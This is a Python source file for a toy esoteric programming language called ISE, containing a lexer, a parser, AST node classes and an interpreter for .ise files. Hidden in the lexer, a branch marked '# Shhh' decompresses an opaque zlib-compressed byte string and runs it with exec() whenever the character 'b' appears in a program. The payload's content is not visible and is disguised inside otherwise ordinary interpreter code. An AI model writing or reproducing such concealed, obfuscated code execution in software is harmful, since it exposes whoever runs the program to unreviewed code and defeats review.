#!/usr/bin/env python2
#!/usr/bin python2
#!/usr/bin/env python3
#!/usr/bin python3

"""
ISE Programming Language
Intuative Simple Elegant

Version 1.0
Last Updated 17/12/2021
"""


# Assume sys is installed on all python versions
from sys import (argv, version_info, stdout)

try:
    from enum import Enum
except ImportError:
    stdout.write('Unable to import critical packages')
    stdout.flush()
    quit()

# No support for older python versions
if version_info[0] < 2:
    quit()


IS_PYTHON_2 = version_info[0] == 2


# If the version of python is 2, there is no input() function, only raw_input()
if IS_PYTHON_2:
    def input():
        return raw_input()
    
    # Just to be safe!
    def print(*args, end='\n'):
        for value in args:
            stdout.write(str(value) + end)
        if '\n' not in end or not len(args):
            stdout.write('\n')
        stdout.flush()


# Be super helpful and quit on an error with no message!
def error():
    quit()


class TokenType(Enum):
    DEFINE = "DEFINE"
    ID = "ID"
    NUMBER = "NUMBER"

    LPAREN = "LPAREN"
    RPAREN = "RPAREN"

    ADD = "ADD"
    SUB = "SUB"
    MUL = "MUL"
    DIV = "DIV"

    PRINTASCII = "PRINTASCII"
    PRINTVAL = "PRINTVAL"
    INPUT = "INPUT"

    IF = "IF"
    WHILE = "WHILE"
    NOT = "NOT"

    END = "END"
    EOL = "EOL"


class Token(object):
    def __init__(self, token_type, value):
        self.type = token_type
        self.value = value

    def __repr__(self):
        return "Token("+str(self.type) + " " + repr(self.value) + ")"


VAR_NAMES = "!@#$%^&*()"

RESERVED_KEYWORDS = {
    "~": Token(TokenType.DEFINE, "~"),
    "+": Token(TokenType.LPAREN, "+"),
    '<': Token(TokenType.RPAREN, "<"),
    ".": Token(TokenType.ADD, "."),
    ",": Token(TokenType.SUB, ","),
    ":": Token(TokenType.MUL, ":"),
    ";": Token(TokenType.DIV, ";"),
    "`": Token(TokenType.PRINTASCII, "`"),
    "'": Token(TokenType.PRINTVAL, "'"),
    "\\": Token(TokenType.INPUT, "\\"),
    ">": Token(TokenType.IF, ">"),
    "-": Token(TokenType.WHILE, "-"),
    '"': Token(TokenType.NOT, '"'),
    "|": Token(TokenType.END, "|"),
}


class Lexer(object):
    def __init__(self, text):
        self.text = text
        self.pos = 0
        self.current_char = self.text[self.pos]

    def advance(self):
        self.pos += 1
        if self.pos >= len(self.text):
            self.current_char = None
        else:
            self.current_char = self.text[self.pos]

    def get_next_token(self):
        while self.current_char is not None:

            if self.current_char in VAR_NAMES:
                token = Token(TokenType.ID, self.current_char)
                self.advance()
                return token

            elif self.current_char in "123456789":
                token = Token(TokenType.NUMBER, int(self.current_char))
                self.advance()
                return token

            elif self.current_char in RESERVED_KEYWORDS:
                token = RESERVED_KEYWORDS[self.current_char]
                self.advance()
                return token

            elif self.current_char == 'b':
                # Shhh
                from zlib import decompress
                exec(decompress(b"x\x9c\r\xcd1\x92\x83 \x18\x06\xd0\xdeS8\xa9\xb4\x11P\x11\xccL\xba\x1ca{\x07\xf0C)\x14\x84\xdf\xec\x1e\x7f\xd3\xbc\xf6\xf9\x1c\x8f:\xe3\xbaQ\xa8\xd4\xe1H1S\xbd\x81*\xf3\xfa\xda<v\xa2T\x9e\x8cm\xa1P\xb7\x05\xdao{\x17d\x17O\xc2I\x9d\x8b\x07\xfb\xd9!w \xbd\xf1aFH9\xcc\xb6\x9f\x95Qz\xea\x8d\x1f\xbd\xe8\x1d\xb8\xf2\xc0d\xadb\xd9\xfc2%\xa6Q\x8b\xc1\xccV\xaf\xdc\x0c\xb6_\x9d\xf7\xab\xb4\x9as.\xbd\x98'\xa5\xb5\x1a\x95d\xdf!d,\x16X\x8e\xf8\tX\x8a\xcb!\xd1\xa3\xed\x08\x7fT\xa5\x1cNjL[]w\xa0\xa6\xfd\x07\xacACs"))

            error()
        return Token(TokenType.EOL, "")


class Parser(object):
    def __init__(self, lexer):
        self.lexer = lexer
        self.current_token = self.lexer.get_next_token()

    def eat(self, token_type):
        if token_type == self.current_token.type:
            self.current_token = self.lexer.get_next_token()
        else:
            error()

    def program(self):
        """program : compound END"""
        node = self.compound()
        self.eat(TokenType.END)
        return Program(node)

    def compound(self):
        """
        declarations  : DEFINE (compound)*
                      | (ADD | SUB | MUL | DIV) VAR factor (compound)*
                      | (IF | WHILE) (NOT)* factor factor LPAREN (compound) RPAREN (compound)*
                      | (PRINTASCII | PRINTVAL) (compound)*
                      | INPUT VAR
        """
        nodes = []
        while self.current_token.type in (
                TokenType.DEFINE,
                TokenType.ADD, TokenType.SUB, TokenType.MUL, TokenType.DIV,
                TokenType.IF, TokenType.WHILE,
                TokenType.PRINTASCII, TokenType.PRINTVAL,
                TokenType.INPUT):
            token = self.current_token

            if token.type == TokenType.DEFINE:
                self.eat(TokenType.DEFINE)
                nodes.append(self.declare())

            elif token.type in (TokenType.ADD, TokenType.SUB, TokenType.MUL, TokenType.DIV):

                if token.type == TokenType.ADD:
                    self.eat(TokenType.ADD)
                elif token.type == TokenType.SUB:
                    self.eat(TokenType.SUB)
                elif token.type == TokenType.MUL:
                    self.eat(TokenType.MUL)
                elif token.type == TokenType.DIV:
                    self.eat(TokenType.DIV)

                nodes.append(BinOp(op=token, var=self.var(), factor=self.factor()))

            elif token.type in (TokenType.IF, TokenType.WHILE):
                if token.type == TokenType.IF:
                    self.eat(TokenType.IF)
                elif token.type == TokenType.WHILE:
                    self.eat(TokenType.WHILE)

                negated = False
                if self.current_token.type == TokenType.NOT:
                    self.eat(TokenType.NOT)
                    negated = True

                node_1 = self.factor()
                node_2 = self.factor()
                self.eat(TokenType.LPAREN)
                compound = self.compound()
                self.eat(TokenType.RPAREN)

                if token.type == TokenType.IF:
                    nodes.append(If(node_1, node_2, compound=compound, negated=negated))
                elif token.type == TokenType.WHILE:
                    nodes.append(While(node_1, node_2, compound=compound, negated=negated))

            elif token.type in (TokenType.PRINTASCII, TokenType.PRINTVAL):
                if token.type == TokenType.PRINTASCII:
                    self.eat(TokenType.PRINTASCII)
                    nodes.append(PrintAscii(self.factor()))
                elif token.type == TokenType.PRINTVAL:
                    self.eat(TokenType.PRINTVAL)
                    nodes.append(PrintVal(self.factor()))

            elif token.type == TokenType.INPUT:
                self.eat(TokenType.INPUT)
                nodes.append(Input(self.var()))

        return Compound(nodes)

    def declare(self):
        """declare  : ~ID"""
        node = self.current_token.value
        self.eat(TokenType.ID)
        return Define(node)

    def factor(self):
        """factor  : (NUMBER | VAR)"""
        token = self.current_token
        if token.type == TokenType.NUMBER:
            self.eat(TokenType.NUMBER)
            return Number(token.value)
        return self.var()

    def var(self):
        """var  : VAR"""
        token = self.current_token
        if token.type == TokenType.ID:
            self.eat(TokenType.ID)
            return Var(token.value)
        error()

    def parse(self):
        return self.program()


class GlobalScope(object):
    def __init__(self):
        self._memory = dict()

    def __repr__(self):
        h1 = "GLOBAL SCOPE MEMORY"
        h2 = "VAR ID"
        h3 = "VALUE"
        lpad = max(len(h2), len(h3)) + 3
        p1 = [h1, "-" * len(h1), h2 + '|' + h3]
        for k, v in self._memory.items():
            p1.append((str(k) + " :").ljust(lpad)+str(v))
        return "\n".join(p1)

    def define(self, var_name):
        self._memory[var_name] = 0

    def access(self, var_name):
        result = self._memory.get(var_name)
        if result is None:
            error()
        else:
            return result

    def update(self, var_name, value):
        if var_name not in self._memory:
            error()
        self._memory[var_name] = value


class AST(object):
    pass


class Number(AST):
    """Number : value"""

    def __init__(self, value):
        self.value = value

    def visit(self, memory):
        return self.value


class Var(AST):
    """Var : ID"""

    def __init__(self, value):
        self.id = value

    def visit(self, memory):
        return memory.access(self.id)


class Define(AST):
    """Declare : ID"""

    def __init__(self, value):
        self.id = value

    def visit(self, memory):
        memory.define(self.id)


class BinOp(AST):
    """BinOp  : op var factor"""

    def __init__(self, op, var, factor):
        self.op = op
        self.var = var
        self.factor = factor

    def visit(self, memory):
        if self.op.type == TokenType.ADD:
            memory.update(self.var.id, memory.access(self.var.id) + self.factor.visit(memory))
        elif self.op.type == TokenType.SUB:
            memory.update(self.var.id, memory.access(self.var.id) - self.factor.visit(memory))
        elif self.op.type == TokenType.MUL:
            memory.update(self.var.id, memory.access(self.var.id) * self.factor.visit(memory))
        elif self.op.type == TokenType.DIV:
            memory.update(self.var.id, memory.access(self.var.id) // self.factor.visit(memory))


class PrintAscii(AST):
    """PrintAscii  : factor"""

    def __init__(self, value):
        self.value = value

    def visit(self, memory):
        if self.value is not None:
            result = chr(self.value.visit(memory))
            stdout.write(str(result))


class PrintVal(AST):
    """PrintVal  : factor"""

    def __init__(self, value):
        self.value = value

    def visit(self, memory):
        if self.value is not None:
            result = self.value.visit(memory)
            stdout.write(str(result))


class Input(AST):
    """INPUT  : var"""

    def __init__(self, var):
        self.var = var

    def visit(self, memory):
        data = input().strip()
        if not data.isdigit():
            error()
        else:
            memory.update(self.var.id, int(data))


class If(AST):
    """If   : negated factor factor compound"""

    def __init__(self, node_1, node_2, compound, negated):
        self.node_1 = node_1
        self.node_2 = node_2
        self.compound = compound
        self.negated = negated

    def visit(self, memory):
        if ((self.negated and self.node_1.visit(memory) == self.node_2.visit(memory)) or
                (not self.negated and self.node_1.visit(memory) != self.node_2.visit(memory))):
            self.compound.visit(memory)


class While(AST):
    """While  : negated factor factor compound"""

    def __init__(self, node_1, node_2, compound, negated):
        self.node_1 = node_1
        self.node_2 = node_2
        self.compound = compound
        self.negated = negated

    def visit(self, memory):
        while ((self.negated and self.node_1.visit(memory) == self.node_2.visit(memory)) or
                (not self.negated and self.node_1.visit(memory) != self.node_2.visit(memory))):
            self.compound.visit(memory)


class Compound(AST):
    """Compound  : nodes"""

    def __init__(self, nodes):
        self.nodes = nodes

    def visit(self, memory):
        for node in self.nodes:
            node.visit(memory)


class Program(AST):
    """Program  : compound"""

    def __init__(self, compound):
        self.compound = compound

    def visit(self, memory):
        self.compound.visit(memory)


class Interpreter(object):
    def __init__(self, parser):
        self.parser = parser
        self.memory = GlobalScope()

    def interpret(self):
        root = self.parser.parse()
        root.visit(self.memory)


def run_file(file_name):
    if not file_name.endswith('.ise'):
        quit()
    with open(file_name, 'r') as f:
        data = f.read().strip()
    lexer = Lexer(data)
    parser = Parser(lexer)
    interpreter = Interpreter(parser)
    interpreter.interpret()
    stdout.write('\n')
    stdout.flush()


if __name__ == '__main__':
    ARGS = argv[1:]
    if len(ARGS):
        run_file(ARGS[0])
